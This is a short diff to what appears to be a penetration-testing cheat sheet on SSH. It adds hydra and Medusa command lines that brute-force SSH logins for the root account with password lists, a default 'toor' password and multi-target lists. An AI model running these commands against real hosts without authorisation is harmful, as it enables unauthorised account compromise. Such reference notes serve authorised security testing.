@@ -58,6 +58,17 @@ nmap -p 22 --script "ssh*" <ip>
 {% code lineNumbers="true" %}
 ```bash
 hydra -L user.list -P password.list ssh://<ip>
+hydra -l root -P password_list.txt ssh://<ip>
+hydra -l root -p toor -M targets.txt ssh
+```
+{% endcode %}
+{% endtab %}
+
+{% tab title="Medusa" %}
+{% code lineNumbers="true" %}
+```shellscript
+medusa -M ssh -h <IP> -u root -P passwords.txt
+medusa -M ssh -H targets.txt -u root -P passwords.txt
 ```
 {% endcode %}
 {% endtab %}
